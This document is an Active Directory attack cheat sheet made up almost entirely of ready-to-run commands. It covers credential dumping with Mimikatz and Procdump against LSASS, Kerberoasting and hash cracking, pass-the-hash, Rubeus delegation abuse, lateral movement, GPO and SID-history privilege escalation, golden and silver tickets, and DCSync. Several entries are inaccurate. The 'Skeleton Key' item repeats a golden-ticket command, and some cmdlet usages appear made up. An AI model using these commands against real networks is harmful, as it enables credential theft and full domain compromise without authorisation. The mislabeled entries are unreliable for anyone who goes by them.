
#### **1. Enumeration**

- **Domain Controllers**:
  
  ```powershell
  nltest /dclist:domain_name
  ```

- **Domain Trusts**:
  
  ```powershell
  nltest /domain_trusts
  ```

- **Enumerate Users, Groups, and Computers**:
  
  ```powershell
  Get-ADUser -Filter * -Properties SamAccountName, DisplayName, Mail, MemberOf
  Get-ADGroup -Filter * -Properties Name, Description
  Get-ADComputer -Filter * -Properties Name, OperatingSystem, LastLogonDate
  ```

- **Service Principal Names (SPNs)**:
  
  ```powershell
  Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName
  ```

#### **2. Credential Dumping**

- **Mimikatz**:
  
  ```powershell
  sekurlsa::logonpasswords
  sekurlsa::tickets
  lsadump::lsa /patch
  ```

- **Dump LSASS with Procdump**:
  
  ```powershell
  .\Procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
  ```

  Load dump in Mimikatz:
  
  ```powershell
  sekurlsa::minidump lsass_dump.dmp
  sekurlsa::logonpasswords
  ```

#### **3. Kerberoasting**

- **Extract SPN Hashes**:
  
  ```powershell
  Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII kerberoast.txt
  ```

- **Crack SPN Hashes**:
  
  ```sh
  hashcat -m 13100 kerberoast.txt wordlist.txt
  ```

#### **4. Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)**

- **Mimikatz PtH**:
  
  ```powershell
  sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:cmd.exe
  ```

- **Mimikatz PtT**:
  
  ```powershell
  kerberos::ptt ticket.kirbi
  ```

#### **5. Delegation Attacks**

- **Unconstrained Delegation**:
  
  - **Identify Accounts**:
  
```powershell
Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Property SamAccountName
```

  - **Exploit with Rubeus**:
  
    ```powershell
    Rubeus.exe tgtdeleg /user:USERNAME /rc4:HASH
    ```

- **Constrained Delegation**:
  
  - **Identify Delegated Services**:
    
```powershell
Get-ADObject -Filter { msDS-AllowedToDelegateTo -ne "$null" } -Property SamAccountName, msDS-AllowedToDelegateTo
```

  - **Attack via S4U2Self and S4U2Proxy**:
    
```powershell
Rubeus.exe s4u /user:USERNAME /rc4:HASH /target:TARGET /impersonateuser:TARGETUSER /msdsspn:"SERVICE/hostname"
```

- **Resource-Based Constrained Delegation (RBCD)**:
  
  - **Exploit with Rubeus**:
    
```powershell
Rubeus.exe s4u /user:ATTACKER_USER /rc4:HASH /target:TARGET /msdsspn:"SERVICE/hostname"
```

#### **6. Just Enough Administration (JEA) Bypass**

- **Enumerate JEA Configurations**:
  
```powershell
Get-PSSessionConfiguration | Where-Object { $_.RunAsUser -ne $null }
```

- **Bypass JEA via Token Manipulation**:
  
```powershell
Invoke-TokenManipulation -ImpersonateUser "TargetUser"
```

- **Escalate Privileges via JEA**:
  
```powershell
New-PSSession -ConfigurationName "JEA Session" -ComputerName "TARGET" -Credential (Get-Credential)
```

#### **7. Just-In-Time (JIT) Administration Exploitation**

- **Identify JIT Accounts**:
  
```powershell
Get-ADGroupMember -Identity "Privileged Access Workstation" -Recursive
  ```

- **Abuse JIT via Shadow Principals**:
  
  ```powershell
  Get-ADUser -Filter * -Property memberOf | Where-Object { $_.memberOf -like "*Shadow Principals*" }
  ```

- **Exploit JIT by Compromising PAWs**:
  
  ```powershell
  Invoke-Mimikatz -Command '"sekurlsa::pth /user:ADMIN_USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe"'
  ```

#### **8. Lateral Movement**

- **WMI Execution**:
  
  ```powershell
  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c dir" -ComputerName TARGET_IP -Credential (Get-Credential)
  ```

- **PsExec**:
  
  ```sh
  psexec.exe \\TARGET_IP -u USERNAME -p PASSWORD cmd.exe
  ```

- **PowerShell Remoting**:
  
  ```powershell
  Enter-PSSession -ComputerName TARGET_IP -Credential (Get-Credential)
  ```

#### **9. Privilege Escalation**

- **Enumerate Privileged Groups**:
  
  ```powershell
  Get-ADGroupMember -Identity "Administrators"
  Get-ADGroupMember -Identity "Domain Admins"
  ```

- **GPO Abuse**:
  
  ```powershell
  Invoke-GPOAddAdmin -AccountName "DOMAIN\Username" -TargetGPOName "GPOName"
  ```

- **SID History Injection**:
  
  ```powershell
  mimikatz # sid::patch
  mimikatz # sid::add /sid:S-1-5-21-... /user:USERNAME
  ```

#### **10. Advanced Attacks**

- **Golden Ticket**:
  
  ```powershell
  kerberos::golden /user:USERNAME /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /id:500
  ```

- **Silver Ticket**:
  
  ```powershell
  kerberos::golden /domain:DOMAIN /sid:S-1-5-21-... /target:TARGET /service:cifs /rc4:HASH /user:USERNAME /id:500
  ```

- **DCSync Attack**:
  
  ```powershell
  lsadump::dcsync /user:DOMAIN\krbtgt
  ```

- **Skeleton Key**:
  
  ```powershell
  kerberos::golden /user:USERNAME /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /rc4:HASH /aes256:HASH /id:500 /ptt
  ```

